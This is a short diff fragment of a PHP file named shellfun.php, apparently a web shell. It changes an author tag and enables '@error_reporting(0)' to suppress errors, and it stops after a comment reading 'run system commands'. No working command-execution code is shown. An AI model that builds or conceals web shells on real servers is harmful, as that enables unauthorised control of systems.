@@ -1,12 +1,9 @@
 <?php
 
 // shellfun.php
-// WSTN
-// 2015-05-13
+// WSTNPHX
 
-
-//@error_reporting(0);
-
+@error_reporting(0);
 
 // run system commands
 echo <<<EOD
